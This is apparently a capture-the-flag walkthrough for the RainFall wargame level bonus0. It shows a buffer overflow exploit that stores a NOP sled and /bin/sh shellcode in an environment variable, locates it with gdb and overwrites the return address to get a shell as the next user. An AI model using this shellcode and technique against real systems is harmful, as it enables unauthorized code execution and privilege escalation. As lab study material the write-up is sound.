offset calculated is 9

We will use our env as a buffer we can control during execution  
The env variable will contain our shellcode

```bash
export EXPLOIT=$(python -c 'print "\x90" * 50 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"')
```

Lets examine our env to find out its address

```bash
(gdb) x/200s environ
0xbffff8c6:	 "EXPLOIT=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\311\367\341Qh//shh/bin\211\343\260\v̀"


```

Lets look at the address

```bash
(gdb) x/50x 0xbffff8c6
0xbffff8c6:	0x45	0x58	0x50	0x4c	0x4f	0x49	0x54	0x3d
0xbffff8ce:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff8d6:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff8de:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff8e6:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff8ee:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff8f6:	0x90	0x90

```

The start of our shellcode is `\x90\x90\90`  
Here we can see those bytes at `0xbffff8ce` == `\xce\xf8\xff\xbf`
Why ? Because we need to skip 8 chars ("EXPLOIT="), so we skip the first 8 bytes

The offset in memory in gdb may be a bit different, that is why we put a lot of NOP instruction (`\x90`)
Lets jump further to jump into the `\x90` : `\xe4\xf8\xff\xbf`

Now in the program we can jump to our env variable with our payload

## Payload

FONCTIONNE

```bash
(python -c 'print ("A" * 20)'; python -c 'print ("A" * 9 + "\xe4\xf8\xff\xbf" + "A" * 7)'; cat)  | ./bonus0
```

```bash
bonus0@RainFall:~$ (python -c 'print ("A" * 20)'; python -c 'print ("A" * 9 + "\xe4\xf8\xff\xbf" + "A" * 7)'; cat)  | ./bonus0
 -
 -
AAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAA��� AAAAAAAAA����AAAAAAA���
whoami
bonus1
```
